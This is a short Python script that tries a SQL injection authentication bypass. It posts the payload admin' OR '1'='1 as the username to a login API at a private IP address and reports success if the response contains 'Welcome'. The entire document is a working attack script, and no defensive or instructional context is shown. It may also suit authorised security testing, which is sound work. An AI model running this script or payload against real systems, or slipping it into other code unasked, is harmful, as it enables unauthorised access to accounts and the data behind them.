import requests

url = "http://192.168.0.1/api/login"
data = {"username": "admin' OR '1'='1", "password": "anything"}
response = requests.post(url, data=data)

if "Welcome" in response.text:
    print("SQL Injection successful")
else:
    print("SQL Injection failed")
